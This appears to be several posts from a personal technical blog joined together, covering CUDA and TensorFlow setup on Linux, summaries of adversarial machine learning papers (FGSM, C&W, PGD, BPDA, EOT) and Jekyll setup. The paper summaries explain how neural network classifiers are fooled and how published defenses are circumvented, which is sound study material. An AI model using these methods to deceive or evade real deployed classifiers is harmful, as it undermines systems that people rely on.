After that, we should install CUDA.Check CUDA version: cat /usr/local/cuda/version.txt.If we want to download package by ourselves, we should check the website first to find the right version for our system. The greatest way to install it is following the official guide.There is also a supportive tutorial for installation cuda and cudnn for ubuntu.Debian CUDA installRecently, I need to install cuda11-1 and nvidia driver on debian 11. Here is something that I achieve based on the experience.The key point is that the cuda package can be used smoothly on debian 11 from my testing.The faster method is using sudo apt install nvidia-cuda-toolkit . However, it can just install the latest version. In my case, it will install cuda11-2 while torch cannot support such a new version.Then I tried several methods on the internet. But the solution is just based on the previous method.sudo add-apt-repository ppa:graphics-drivers/ppasudo apt-get updatesudo apt install nvidia-driversudo apt-key adv --fetch-keys  http://developer.download.nvidia.com/compute/cuda/repos/debian10/x86_64/7fa2af80.pubsudo bash -c 'echo \"deb http://developer.download.nvidia.com/compute/cuda/repos/debian10/x86_64 /\" &gt; /etc/apt/sources.list.d/cuda.list'sudo apt-get updatesudo apt install cuda-11-1if [ -d \"/usr/local/cuda/bin/\" ]; then    export PATH=/usr/local/cuda/bin${PATH:+:${PATH}}    export LD_LIBRARY_PATH=/usr/local/cuda/lib64${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}fireboot -iThen just enjoy the new world.Conda Usage1. search available python versionconda search \"^python$\"2. Create or Remove conda environmentconda remove --name myenv --allconda create -n env python==3.6Tensorflow Usage Problem Recording1. Tensorflow does not use GPUIn the case, I actually installed cuda and Nvidia driver at first. So it is because I did not add cuda/bin and related library to the .bashrc.By adding the following code to .bashrc file will solve the problem.export PATH=/usr/local/cuda-10.2/bin/:$PATHexport LD_LIBRARY_PATH=/usr/local/cuda-10.2/lib64:${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}Besides, I think it is a useful tutorial for use Tensorflow on GPU.Tensorflow2.1 is not useful for CUDA10.2 due to the lack of some libraries.So I reinstall CUDA10.1 for tensorflow2.1-gpu.Test tensorflow for GPUimport tensorflow as tftf.test.is_gpu_available(cuda_only=False,min_cuda_compute_capability=None)2. Install TensorRT for Tensorflow2-GPU versionOfficial tutorial: TensorRT is not a must for tensorflow-gpu. It is just useful for speed up training process.3.

Cannot visit tensorflow.org official websiteIn the case, the following step is useful for Mac. Linux should edit its specific hosts file.  edit /private/etc/hosts  add 64.233.188.121 www.tensorflow.org5. Tensorflow GPU Allocation ProblemBy default, tensroflow will use all gpu memories to update efficiency. The way to use specific memory is by following codes in two ways. More details are available on the linktf.config.experimental.set_memory_growth:gpus = tf.config.experimental.list_physical_devices('GPU')if gpus:  try:    # Currently, memory growth needs to be the same across GPUs    for gpu in gpus:      tf.config.experimental.set_memory_growth(gpu, True)    logical_gpus = tf.config.experimental.list_logical_devices('GPU')    print(len(gpus), \"Physical GPUs,\", len(logical_gpus), \"Logical GPUs\")  except RuntimeError as e:    # Memory growth must be set before GPUs have been initialized    print(e)tf.config.experimental.set_virtual_device_configuration:gpus = tf.config.experimental.list_physical_devices('GPU')if gpus:  # Restrict TensorFlow to only allocate 1GB of memory on the first GPU  try:    tf.config.experimental.set_virtual_device_configuration(        gpus[0],        [tf.config.experimental.VirtualDeviceConfiguration(memory_limit=1024)])    logical_gpus = tf.config.experimental.list_logical_devices('GPU')    print(len(gpus), \"Physical GPUs,\", len(logical_gpus), \"Logical GPUs\")  except RuntimeError as e:    # Virtual devices must be set before GPUs have been initialized    print(e)6.

Allocation problemWarning: ensorflow/core/framework/allocator.cc:101] Allocation of X exceeds 10% of system memorySolution: The main problem is the batch_size is too big. Sometimes the problem is on related settings like shuffle function intf.data.Dataset.from_tensor_slices((x_train, y_train)).shuffle().10. How to use @tf.function [Need Digging into]When I want to change the gradients when training by function train_step on tensorflow2, I found that if I did not use @tf.function before the train_step function, the accuracy grow very slow. But if I add @tf.function, the process becomes normal without considering optimizers and data type. The related code is here.@tf.functiondef fix_train_step(model, images, labels, all_mask):  with tf.GradientTape() as tape:    predictions = model(images)    loss = loss_object(labels, predictions)  gradients = tape.gradient(loss, model.trainable_variables)  for i in range(len(all_mask)):    gradients[i] = gradients[i] * all_mask[i]  optimizer.apply_gradients(zip(gradients, model.trainable_variables))  train_loss(loss)  train_accuracy(labels, predictions)11. Problem after suspending the MachineAfter I suspend the ubuntu, I met with such problemfailed call to cuInit: CUDA_ERROR_UNKNOWN and I cannot use GPU. Rebooting it probably can solve the problem.

    "content": "In this blog, I summarize the top nine most important papers related to adversarial DNN attacking from the paper which promotes adversarial examples firstly to the advanced attacking methods such as C&amp;W attack, BPDA and EOT.FYI, I find a very useful lecture from Prof. Somesh Jha to summarize both the attack and defense on Machine Learning.1. Poisoning attack against support vector machinesAuthor-Time-ArXiv: Battista Biggio, Blaine Nelson, Pavel Laskov;ICML 2012; 1206.6389Keywords: Targeted Attack,The paper uses the gradient ascent attack on SVM to increase the model’s test error.2. Intriguing properties of neural networksAuthor-Time-ArXiv: Ian Goodfellow etc.;ICLR2014; 1312.6199Key points:  The input-space contains the semantic information in neural networks instead of individual units.  The input-output mapping is discontinuous so the perturbation will cause flips on prediction.  The perturbation is transferable.  Promoting a targeted attack based on box-constrained L-BFGS which is a matrix form of Newton’s method for optimization.2.1 IntroductionThere are two counter-intuitive properties of DNN which are the semantic meaning of individual units and the stability of neural network with small perturbations to inputs.Firstly, they conclude that the whole activation space contains the semantic information instead of the last feature layers’ bias used in the researches before. Then, they find a small perturbation is able to change the network’s prediction. They take the training data which are perturbed by maximizing the prediction error as adversarial examples. What’s more, they figure out these adversarial examples are able to be transferred to another model trained on a different subset of the dataset. Consequently, the DNN model structure is connected to the data distribution in a non-obvious way.2.2 Blind Spots in Neural NetworksThe regions in input space mapped by the output unit contain no training examples nearby. These regions share label and the statistical structure of the original inputs. On the other hand, the smoothness assumption that predictions changed based on perturbations smoothly does not hold. So the local generalization of the training data are useful for finding adversarial examples in the input space.Formal DescriptionMinimize \\(c\\cdot\\vert\\vert r\\vert\\vert_2+loss_f(x+r,l)\\) subject to \\(x+r\\in [0,1]^m\\)\\(f:\\mathbb{R}^m\\rightarrow\\{1\\dots k\\}\\) is a classifier mapping image pixel value vectors to a discrete label set.\\(loss_f:\\mathbb{R}^m\\times\\{1\\dots k\\}\\rightarrow\\mathbb{R}^+\\) is a continuous loss function.Target label \\(l\\in\\{1\\dots k\\}\\)3. Explaining and Harnessing Adversarial ExamplesAuthor-Time-ArXiv: Ian Goodfellow etc.; ICLR2015;1412.6572Key Points:  The main cause of adversarial examples is DNN’s linear nature and the requirement is the sufficient dimensional inputs.  Promoting Fast Gradient Sign Method to generate adversarial examples.  Exploiting adversarial training on simple models and DNN models.3.1 The Linear Explanation and PerturbationThe appearance of adversarial examples is because the DNNs do not learn the true concepts of the whole data to complete the tasks. They are just trained under some discontinuous dataset. Consequently, the linearity of DNN models means that many small perturbations which cannot be detect by eyes will add up to a large change to output.A simple linear model can have adversarial examples if its input has enough dimensionality which is the reason softmax regression is vulnerable. So the paper promotes the fast gradient sign method. It generates adversarial examples to get an optimal max-norm constrained perturbation.\\[\\eta=\\epsilon sign(\\nabla_xJ(\\theta,x,y))\\]\\(\\theta\\) is the model parameters. \\(x\\) is the input while \\(y\\) is the target(true) label. \\(J(\\theta,x,y)\\) is the loss function and its gradient of \\(x\\) will represent the perturbation in every direction of \\(x\\).3.2 Adversarial TrainingMore work Needed: A example to use logistic regression model to train on adversarial examples with weight decay. While the problem is these adversarial examples will be under-fitting.The paper also uses adversarial training on DNN models. The objective function based on FGSM is an effective regularizer:\\[\\tilde J(\\theta,x,y)=\\alpha J(\\theta,x,y)+(1-\\alpha)J(\\theta,x+\\epsilon sign(\\nabla_xJ(\\theta,{x},y)))\\]It means that the adversarial examples update through training.3.3 ExploitThe adversarial examples appear in a contiguous subspace defined by FGSM. The paper also tries to confirm two hypotheses.      Adversarial training provides more constraint on the training process but the improvement is not enough.        Averaging several models which aims to wash out adversarial examples has only limited resistance.  Appendix: Rubbish Class ExamplesThese examples are degenerate inputs which are meaningless to any category (like noise) but are positive classes in the DNN models. The best result of these examples is prediction is low at any category.Guess:  Adversarial Examples exist because DNN cannot restrict all directions in the input space which will lead to a bad accuracy of the validation set.  We can use constraints of every classes in the input space to promote the robustness of DNN models.4. Adversarial Examples In the Physical WorldAuthor-Time-ArXiv: Alexey Kurakin etc.; ICLR2017; 1607.02533Key Points:  The ML systems in physical world scenarios are vulnerable to adversarial examples.  Promoting iterative FGSM and Least-likely Class Attack.  Exploiting the data transformation’s impact on adversarial examples.4.1 Iterative Fast Gradient Sign MethodThe paper puts forward two iterative FGSMs which are basic iterative method and iterative least-likely class method.4.1.1 Basic iterative FGSMThe basic iterative method which is a non-targeted attack generates adversarial examples as follow:\\[X_0^{adv} = X, X_{N+1}^{adv}=Clip_{X,\\epsilon}\\{X_N^{adv}+\\alpha sign(\\nabla_XJ(X_N^{adv},y_{true}))\\}\\]\\(X\\) is a 3-D tensor(width, height, depth) which are integers in the range [0, 255]. \\(y_{true}\\) is the ground truth. \\(J({X},y)\\) is cross-entropy cost function of neural network. \\(Clip_{X,\\epsilon}\\{X'\\}\\) clip the image per-pixel so the result image is \\(L_\\infty\\) \\(\\epsilon\\)-neighborhood of the original image.\\[Clip_{X,\\epsilon}\\{X'\\}(x,y,z)=min\\{255, X(x,y,z)+\\epsilon,max\\{0,X(x,y,z)-\\epsilon,X'(x,y,z)\\}\\}\\]where \\({X}(x,y,z)\\) is the value of \\(z\\) of the image \\({X}\\) at coordinated \\((x,y)\\).4.1.2 Iterative least-likely Class MethodThe iterative least-likely class method, also called LLC, is a targeted attack. The target label is defined as \\(y_{LL}=\\underset{x}{\\mathrm{argmin}}\\{p(y\\vert {X})\\}\\) which presents the least likely class in the whole categories.\\[{X}_0^{adv} = {X}, {X}_{N+1}^{adv}=Clip_{X,\\epsilon}\\{X_N^{adv}-\\alpha sign(\\nabla_XJ({X}_N^{adv},y_{LL}))\\}\\]4.2 Adversarial Examples in Real WorldThe transformations such as blur, noise and JPEG encoding have impact on destructing adversarial examples while changing brightness or contrast is not useful.5. The Limitations of Deep Learning in Adversarial SettingsAuthor-Time-ArXiv: Nicolas Papernot etc.; EuroS&amp;P2016; 1511.07528Key Points:  Promoting Jacobian-based Saliency Map Attack for acyclic DNN models.In general, the Jacobian-based saliency map constructs the saliency map, the impact of input based on the output’s gradient to find the most important features and then changes them to generate adversarial examples.The JSM method iterates the following steps when \\(F(X^*)\\ne Y^*\\) and \\(\\vert\\vert \\delta_X\\vert\\vert &lt; \\Upsilon\\)      Forward Derivative of a Deep Neural Network from the input to the layer before output    A general idea to calculate the forward derivative for a given \\(X\\): \\(\\nabla F(X)=\\frac{\\partial F(X)}{\\partial X}=[\\frac{\\partial F_j(X)}{\\partial x_i}]_{i,j\\in 1\\dots M}\\) and the formula is essentially the Jacobian of the function.    As to the DNN model, the Jacobian can be computed as follow:\\[\\frac{\\partial F_j(X)}{\\partial x_i}=(W_{n+1,j}\\cdot\\frac{\\partial H_n}{\\partial x_i})\\times\\frac{\\partial f_{n+1,j}}{\\partial x+i}(W_{n+1,j}\\cdot H_n+b_{n+1,j})\\]    where the output neuron \\(j\\) computes the following expression: \\(F_j(X)=f_{n+1,j}(W_{n+1,j}\\cdot H_n+b_{n+1.j})\\)        Constructing the Saliency Map \\(S(X,t)\\) which aims to increase the probabilities of target label \\(t\\) and decrease the probabilities of other labels.\\[S(X,t)[i]=\\begin{cases} 0~if\\frac{F_t(X)}{\\partial X_i}&lt;0 ~or~ \\mathop{\\Sigma}_\\limits{j\\ne t}\\frac{F_j(X)}{\\partial X_i}&gt;0\\\\(\\frac{F_t(X)}{\\partial X_i})\\vert \\sum_{j\\ne t}\\frac{F_j(X)}{\\partial X_i}\\vert~otherwise\\end{cases}\\]    where \\(t=\\mathop{\\arg\\max}_\\limits{j}F_j(X)\\)        Modifying \\(X_{i_{max}}\\) subject to \\(i_{max}=\\mathop{\\arg\\max}_\\limits{i}S(X,Y^*)[i]\\) and adding to the original sample. And the perturbation adding to the input will be set as \\(+/-1\\) which will increase or decrease the pixel intensities.  6. Towards Evaluating the Robustness of Neural NetworksThe details are available on another blog.7. Towards Deep Learning Models Resistant to Adversarial AttacksAuthor-Time-ArXiv: Aleksander Madry etc.; ICLR2018; 1706.060083Key Points:  Promoting Projected Gradient Descent Method(PGD).The essence of PGD attack is that a robust DNN model is required to improve a robust attack. So it will improve both the DNN models and adversarial examples at the same time. The paper defines DNN attack as a min-max optimization problem instead of a minimization or maximization problem:\\(\\mathop{\\min}_\\limits{\\theta} \\rho(\\theta)\\), where \\(\\rho(\\theta)=\\mathbb{E}_{(x,y)\\sim D}[max_{\\delta\\in S}L(\\theta,x+\\delta,y)]\\)\\(D\\) is the data contribution. \\(\\mathbb{E}\\) is the average error in the course of training. In the inner max part, it will find the specific \\(\\delta\\) to maximize the loss while in the outer min part, it will use different model parameters \\(\\theta\\) to reduce the average error.The paper uses FGSM and iterative FGSM which is essentially projected gradient descent. The definition of the PGD is displayed as follow:\\[x^{t+1}=\\prod_{x+S}(x^t+\\alpha sign(\\nabla_xL(\\theta,x,y)))\\]\\(\\prod_{x+S}\\) means projecting the input in the range of \\(x+S\\). And the definition of projection can be described as follows:\\[min_x f(x)~s.t.~x\\in S\\]\\[p^{t+1} = x^t+\\alpha sign(\\nabla f(x^t)) \\\\ x^{t+1} = \\text{arg} \\min_{x \\in C} \\vert\\vert p^{t+1}-x\\vert\\vert\\]8. Obfuscated Gradients Give a False Sense of Security: Circumventing Defenses to Adversarial ExamplesAuthor-Time-ArXiv: Anish Athalye etc; ICML2018 Best Paper; 1802.00420Key Points:  Promoting Backward Pass Differentiable Approximation(BPDA) which is useful on obfuscated-gradient-based defenses.  Displaying that BPDA has a great performance on several gradient-masking based defense methods from ICLR 2018.Basically, the advanced defense method is to break gradient descent by gradient masking. So in the paper, three defense obfuscated gradients are discussed to evaluate the performance of BPDA.  Shattered Gradient  Stochastic Gradients  Exploding and Vanishing Gradients8.1 The Algorithm of Backward Pass Differentiable ApproximationIn general, the BPDA uses the following steps based on iterative optimization-based attack(PGD for \\(l_\\infty\\) and C&amp;W attack for \\(l_2\\)):Algorithm:Let \\(f(\\cdot)=f^{1\\dots j}(\\cdot)\\) be a neural network and let \\(f^i(\\cdot)\\) be a non-differentiable layer.  To approximate \\(\\nabla_xf(x)\\), find a differentiable approximation identity function \\(g(x)\\) such that \\(g(x)\\approx f^i(x)\\).      Calculate \\(\\nabla_xf(x)\\) by performing the forward pass through \\(f( \\cdot )\\).    On the backward pass, replacing \\(f^i(x)\\) with \\(g(x)\\).In contrast to standard PGD or C&amp;W attack, BPDA requires more iterations of gradient descent.The paper lists 7 accepted papers from ICLR2018 and takes them as the evaluation to show the great performance of BPDA.8.2 Gradient ShatteringAt first, it evaluates the non-obfuscated gradients defense like adversarial training and cascade adversarial training which trains a first model to generate adversarial examples and adds them to a second model on the augmented dataset in a single step for efficiency. Since these two defenses are weaker than the later defenses, the paper does not discuss them deeply.8.2.1 Thermometer EncodingThe definition of thermometer encoding is like that. Given an image \\(x\\), for each pixel color \\(x_{i,j,c}\\), the $l$-level thermometer encoding \\(\\tau(x_{i,k,c})\\) is a \\(l\\)-dimensional vector where \\(\\tau(x_{i,j,c})_k=1\\) if \\(x_{i.k.c}&gt;k/l\\) and \\(0\\) otherwise. For example, \\(\\tau(0.66)=1111110000\\) is a 10-level thermometer encoding.In general, thermometer encoding defense can be taken as a way to cause gradient shattering so it is impossible to perform gradient descent on such kind of DNNs.As to BPDA, the paper sets \\(g(x)=min(max(x_{i,j,c}-k/l,0),1)\\) and replaces the backwards pass with \\(g(x)\\).Actually \\(\\tau(x_{i,j,c})_k=floor(g(x))\\). The result shows a great performance of BPDA.8.2.2 Input TransformationsThe defense method uses several input transformations to counter adversarial examples such as image cropping and rescaling, bit-depth reduction and JPEG compression.However, the paper points out that it is possible to bypass each defense respectively and the ensembles of these defenses are not stronger than the sub-defense. The paper uses EOT and BPDA (the paper does not provide details) to circumvent image cropping and rescaling, JPEG compression, image quilting. And the performance of BPDA is also pretty good.8.2.3 Local Intrinsic DimensionalityLID is a general-purpose metric that measures the distance from an input to its neighbors.The paper discovers LID does not detect high confidence adversarial examples even the adversarial examples are oblivious to the defense.8.3 Stochastic Gradients8.3.1 Stochastic Activation PruningSAP randomly drops some neurons of each layer to 0 with probability proportional to their absolute value. Essentially, SAP applies dropout at each layer based on neurons’ weighted distribution. Then these dropped out neurons are retrained and scaled up to retain accuracy.Implementing SAP decreases clean classification accuracy slightly while increasing robustness. And different levels of drop probability  has similar robustness.The paper calculates gradient by \\(\\sum_{i=1}^k\\nabla_xf(x)\\) where \\(k=10\\) to achieve useful gradients instead of \\(\\nabla_xf(x)\\). Finally, the result of the attack is good as well.8.3.2 Mitigating Through RandomizationThe defense adds a randomization layer before the input to the classifier by rescaling and zero-pading the images. The defense dismisses attack by providing lots of choices of randomness.The paper finds the ensemble attack used by the defense authors overfits to these fixed randomization. So the paper uses EOT and optimize the distribution of transformations to bypass the defense.The result of the attack is good.8.4 Vanishing &amp; Exploding Gradients8.4.1 Pixel DefendThe defense’s authors argue that adversarial examples mainly lie in the low-probability region of the data distribution. So PixelDefend purifies adversarially perturbed images before the classification by using a greedy decoding procedure to approximate finding the highest probability example within an \\(\\epsilon\\)-ball of the input image.      Firstly, the joint distribution over all pixels is defined by the product of conditional distributions which originate from PixelCNN. \\(X=[x_1,x_2,\\dots,x_n]\\) presents an image.\\[p_{CNN}(X)=\\prod_ip_{CNN]}(x_i\\vert x_{1:(i-1)})\\]    Every conditional distribution is a multinomial with a 256-way softmax layer based on previous RGB channels as well and each channel variable \\(x_i\\) takes 0 to 255 distinct values. The higher the joint distribution \\(P_{CNN}\\), the more suitable it is to the dataset        The general distribution of datasets is described by bits per dimension. \\(I,J,K\\) are the size and channel of images.    \\(BPD(X)=-logp_{CNN}(X)/(I\\times J\\times K\\times log2)\\).        The defense’s authors use hypothesis testing to detect adversarial examples based on distribution.        Returning benign images to the training distribution.\\[max_{X^*}p_{CNN}(X^*)\\\\s.t.\\vert\\vert X^*-X\\vert\\vert_{\\infty}\\le\\epsilon_{defend}\\]  The paper avoids computing gradients by approximating gradients with BPDA.8.4.2 Defense-GanDefense-Gan uses GAN to project samples onto the manifold of the generator before classification.The BPDA attack does not have a good performance on Defense-Gan.9. Synthesizing Robust Adversarial ExamplesAuthor-Time-ArXiv: Anish Athalye etc.; ICML2018; 1707.07397Key Points:  Promoting Expectation Over Transformation(EOT) which proves the impact of a single adversarial example exists over all of the transformations.  Fabricating the first 3D physical-world adversarial objects to fool classifiers in the real world.The basic approach to generate adversarial examples which aims to maximize the possibility of target label based on the perturbation is not useful when angle and viewpoint changes. Consequently, EOT uses a chosen distribution \\(T\\) of transformation functions \\(t\\) to adjust the input \\(x\\) as  \\(t(x)\\). The perturbation is also set by the expected effective distance as: \\(\\delta=\\mathbb{E}_{t\\sim T}[d(t(x'),t(x))]\\). EOT aims to minimize the visual difference between \\(t(x')\\) and \\(t(x)\\). So the optimization problem has been:\\(\\mathop{\\arg\\max}\\limits_{x'}\\mathbb{E}_{t\\sim T}[logP(y_t\\vert t(x'))]\\), subject to \\(\\mathbb{E}_{t\\sim T}[d(t(x'), t(x))]&lt;\\epsilon, x\\in[0,1]^d\\).The distribution \\(T\\) can model perceptual distortions like rotation, translation or noising. EOT uses SGD to maximize the objective. In the 2D cases, \\(t(x)=Ax+b\\) is used for random transformations. EOT also sets distance as \\(l_2\\) norm in LAB color space which is a perceptually uniform color space in Euclidean distance. So the optimization is set as follow and using PGD to maximize the objective before clipping the set of valid inputs:\\[\\mathop{\\arg\\max}_\\limits{x'}\\mathbb{E}_{t\\sim T}[logP(y_t\\vert t(x'))-\\lambda\\vert\\vert LAB(t(x'))-LAB(t(x))\\vert\\vert_2]\\]"

So the paper analyses thirteen recent defenses by performing adaptive attack in the right way by adjusting objective functions and  hyper-parameters.        Background    The widely adopted approach is promoted by CW attack and Madry. For example, normalization function includes sigmoid function based on the $l_p$-norm.\\[x_{i+1}=Proj(x_i+\\alpha \\cdot normalize(\\nabla_{x_i} L(x_i,y)))\\]    There are four common attack strategies:          Projected Gradient Descent     - C&amp;W attack: \\(maximize_{x'}L(x',y)-\\lambda\\cdot\\vert\\vert x'-x\\vert\\vert_p\\)      Back Pass Differentiable Approximation: Replacing one layer of a neural network \\(f^i(x)\\) by an approximate function \\(g(x)\\) when computing gradient by back propagation if the layer is non-differentiable.     - Expectation Over Transformation: computing gradient by randomized components such as randomized transformation.

Strive for simplicity as to loss function and gradient descent.     - Attack the full defense.      Identify and target important defense parts.     - Adapt the objective function to simplify the attack.      Ensure the loss function is consistent which is a good proxy for attack success.     - Optimize the loss function with different methods      Use a strong adaptive attack for adversarial training or these generated adversarial examples are useless.

    "content": "C&amp;W attack is a pretty insightful attack in adversarial machine learning. So I use this blog to summarize the general ideas of it.Towards Evaluating the Robustness of Neural NetworksAuthors: Nicholas Carlini, David WagnerKey points:  Seven Objective Functions  Three Box Constraints  $c$ choosing method  Three Attack Methods  Images’ discretizationThe paper introduces a famous attacking method called CW attack. They demonstrate defensive distillation is not robust and promising enough under their attacking and CW attack is a better benchmark for future defense methods. Besides, they suggest defense should prevent the transferability of the adversarial examples.1. IntroductionAs we all know, deep neural networks are vulnerable to adversarial examples. And there are several methods to robust these models like defensive distillation. The authors construct three attacks for \\(L_0, L_1, L_\\infty\\) to prove the weakness of these defensive methods and discover that adversarial examples are transferable between different models.2. BackgroundIn the project, the authors assume the adversary is accessible to all of the neural network as a white-box attacking. They evaluate the targeted attack in three conditions: Average case(select random target), Best case(select least difficult target) and Worst case(select most difficult target). On the other hand, when discussing the distance of the adversarial examples, the authors use three metrics from \\(L_p\\) norm to generate these examples. The p-norm is defined as  \\(\\vert\\vert v \\vert\\vert_p=(\\sum_{i=1}^n\\vert v_i\\vert^p)^{\\frac{1}{p}}\\).3. ApproachThe authors discuss four currently advanced attacking methods including L-BFGS, FGS, JSMA and Deepfool. They use two networks for MNIST and CIFAR-10 classification and the pre-trained Inception v3 network for Image-Net classification.The initial method to find adversarial examples is listed as follows:minimize \\(D(x, x+\\delta )\\)  such that \\(C(x+\\delta)=t, x+\\delta\\in[0,1]^n\\)\\(\\delta\\) means perturbation and \\(D()\\) is the distance metric from p-norms while \\(C(x)=argmax_iF(x)_i\\) is the classifier to set label. \\(\\delta\\) can be found by minimizing \\(D(x,x+\\delta)\\).The authors discuss seven objective functions changing \\(C(x+\\delta)=t\\) to \\(f(x+\\delta)\\leq0\\). The final problem has been edited as follows:minimize \\(\\vert \\vert \\delta \\vert \\vert +c\\cdot f(x+\\delta)\\), such that \\(x + \\delta \\in [0,1]^n\\).\\(c\\) is a constant setting by binary search. After testing, there is a key that the objective function cannot have a great changeable derivation because \\(c\\) should change as well to balance the weights between \\(\\delta\\) and \\(f(x+\\delta)\\).After setting the math problem, the constraint should be clear, the authors list three ways to do the job.  Projected gradient descent  Clipped gradient descent  Change of variables4. Three Attacks and their Objective Functions4.1 \\(L_2\\) Attackminimize \\(\\vert \\vert \\frac{1}{2}(tanh(w)+1)-x\\vert \\vert^2_2+c\\cdot f(\\frac{1}{2}(tanh(w)+1))\\) with \\(f\\) defined as \\(f(x')=max(max\\{Z(x')_i:i\\neq t\\}-Z(x')_t, -\\kappa)\\).\\(\\kappa\\) presents the confidence of the \\(i\\)th label and the  \\(\\kappa\\) is set \\(0\\) in the paper. As you can see, the bigger \\(\\kappa\\), the higher success rate of attacking.Besides, to avoid local optimization, they use multiple starting-point gradient descent in the ball of adversarial range.4.2 \\(L_0\\) AttackIterating fixing less important pixels and using \\(L_2\\) attack. After every iteration, they compute \\(g=\\nabla f(x+\\delta)\\) and select \\(i=\\mathop{\\arg\\min}_\\limits{i}g_i\\cdot\\delta_i\\) and then fix \\(i\\).4.3 \\(L_\\infty\\) Attackminimize \\(c\\cdot f(x+\\delta)+\\sum_i [(\\delta_i-\\tau)^+]\\). Using \\(\\tau\\) to set a threshold to avoid adding perturbation on several most influential pixels.The \\(L\\infty\\) distance measures the maximum change to any of the coordinates: \\(\\vert\\vert x-x'\\vert\\vert_\\infty=max(\\vert x_1-x'_1\\vert,\\dots,\\vert x_n-x'_n\\vert)\\)"

    "content": "I try to summarize the main ideas and advanced technologies in this blog. Besides, I will record the progresses and details about the process. As we know, Adversarial Machine Learning has many applications. From the talk of Ian Goodfellow from ICLR2019, the applications include generative Modeling, Security, Model-based optimization, RL, extreme reliability, label efficiency, domain adaptation, Fairness accountability and transparency and Neuroscience.1. Basic Concepts and AlgorithmsFirstly, I need to confirm some basic concepts and their abbreviations, such as Adversarial Example(AE), Targeted Attack(TA) and Un-targeted Attack(UA). The types of attacking and metrics are listed as follows.Un-targeted Attack:  Non-iterative Un-targeted attacks: Fast Gradient Sign Method, R+FGSM  Iterative Un-targeted attacks: Basic Iterative Method, Projected Gradient Descent(PGD), U-MI-FGSM, Deep Fool, Universal Adversarial Perturbation, OptMarginTargeted Attack：Specifying the label to be the least likely class.  Non-iterative Targeted attacks: Least-Likely Class(LLC) attack, R+LLC  Iterative Targeted attacks: Box-constrained L-BFGS(BLB), Iterative LLC, targeted MI-FGSM(T-MI-FGSM), Jacobian-based Saliency Map Attack(JSMA), Carlini and Wagner(CW) attack, Elastic-net Attack to DNNs(EAD), Expectation Over Transformation(EOT),Backward Pass Differentiable Approximation(BPDA)Attacking Metrics:  Misclassification: Misclassification Ratio, Average Confidence of Adversarial Class(ACAC), Average Confidence of True Class(ACTC)  Imperceptibility: Average \\(L_p\\) Distortion, Average Structural Similarity, Perturbation Sensitivity Distance(PSD)  Robustness: Noise Tolerance Estimation, Robustness to Gaussian Blur(RGB), Robustness to Image CompressionSecondly, the defense part is listed as follows.Adversarial Training: Naive Adversarial Training(NAT), Ensemble Adversarial Training(EAT),  PGD-based Adversarial Training(PAT)Gradient Masking/Regularization: Defensive Distillation, Input Gradient Regularization(IGR)Input Transformation: Ensemble Input Transformation(EIT), Random Transformations-based defense(RT), Pixel Defense(PD), Thermometer Encoding(TE)Region-based ClassificationDetection-only Defenses: Local Intrinsic Dimensionality(LID), Feature Squeezing(FS), MagNetDefensing Metrics:  Classification Accuracy Variance(CAV)  Classification Rectify/Sacrifice Ratio(CRR/CSR)  Classification Confidence Variance(CCV)  Classification Output Stability(COS)2. AttackWhen we talk about the adversarial machine learning, we need to the set the threat model firstly. A threat model will outline the attacking type and the defensing ways including the evaluation of the defense. In the adversary’s part of a threat model, goals, knowledge and capabilities will be clear.  Goals: generating inputs to force a ML system to conclude erroneous results.  Knowledge: the knowledge the adversary is assumed to have.  Capabilities: the requirements and the methods of the attacking.          Causing bit-flips on the weights of a neural network.      Causing errors during the data processing pipeline.      Making backdoors.      Perturbing the images to fool the ML systems.      To be more specific, for some natural input \\(x\\) and similarity metric \\(D\\), \\(x'\\) is a adversarial example if \\(D(x, x')\\leq \\epsilon\\) for some small \\(\\epsilon\\) and \\(x'\\) is misclassified. A choice for \\(D\\) is \\(l_p\\)-norm. While the choice of \\(D\\) and \\(\\epsilon\\) varies based on the missions and a small \\(\\epsilon\\) is not always important for malware detection. The definition of the adversary’s capability can be set as follows.(1) \\(\\large{\\mathbb{E}_{(x,y)\\sim\\chi}[max_{x':D(x,x')&lt;\\epsilon}L(f(x'),y)]}\\): \\(L\\) means loss function.(2) \\(\\large{\\mathbb{E}_{(x,y)\\sim\\chi}[min_{x'\\in A_{x,y}}D(x,x')]}\\): \\(A_{x,y}\\) results from the definition of adversarial example, e.g. \\(A_{x,y}=\\{x'\\rvert x' \\neq y\\}\\) for misclassification.3. Defense EvaluationAfter summarizing the algorithms of adversarial machine learning, I need to specify the defense methods to evaluate the performances.At the very beginning, the aim of the defense is as follows.  Defend against an adversary who will attack the system.  Test the worst-case situations of algorithms.  Measure progress of algorithmsBasically, the challenge of security evaluations is the difficulty to evaluate the worst-case robustness and  the different assumptions between vision and security.On the other hands, when we evaluate the algorithms or frameworks, we need to be clear about the requirements. For example, if one proposes a defense method, he should do things as follows.(1) Be skeptical of the results.(2) Try to find the best way to attack the defense method, even if it is not from the existing adversarial attacks.(3) Release full source code and pre-trained models.There is a basic way to complete the evaluation and the pitfall needed to avoid from [3] chapter 3.  State a precise threat model  Perform adaptive attacks  Release pre-trained models and source code  Report clean model accuracy when not under attack  Perform basic sanity tests on attack success rates  Generate an attack success rate vs. perturbation budget curve  Verify adaptive attacks perform better than any other  Describe the attacks applied, including all hyper-parametersMore information is available form [3]4. Important ResearchesNow I want to summarize some important and intuitive papers to dig some real problems and have a deep understanding about them. The reading path is introduced from [5].4.1 Evasion Attacks against Machine Learning at Test Time4.2 Intriguing properties of neural networks4.3 Explaining and Harnessing Adversarial ExamplesReference:  DEEPSEC: A Uniform Platform for Security Analysis of Deep Learning Model  A critique of the DeepSec Platform for Security Analysis of Deep Learning Models  On Evaluating Adversarial Robustness  A complete list of all adversarial example papers  Adversarial Machine Learning Reading List"

    "content": "First thing: Jekyll is a static website framework which is useful for building a blog. Jekyll is build by ruby and need to use gem as a package management.FYI: most of the content of the blog is based on the Mike Dane Youtube Channel.1. Installation and Basic StuffInstallation stepsEnvironent: What I choose is using a ruby version manager chruby and ruby-install to aviod change the Opearting system’s ruby version. Detailsbrew install chruby ruby-installruby-install rubychruby 3.1.0 # change ruby version  Command to new a website: Jekyll new &lt;website-name&gt;.  First time to run the server, bundle exec is a command to execute a script(Gemfile) in the context of the current bundle and change the golbal package version to the specific version in the Gemfile.  Use jekyll serve to run the server.Framework ArchitectureAfter build the website, some key files of the website is like the following items.  _posts: save the blogs.  _layouts: set the layout of interface.  _site: save all the builded static website. Do not need to modify it.  _drafts: save the drafts which do not want to be public. But using jekyll serve --draft will display these drafts in the website.  _config.yml: set the global variables and need to  restart the jekyll server to 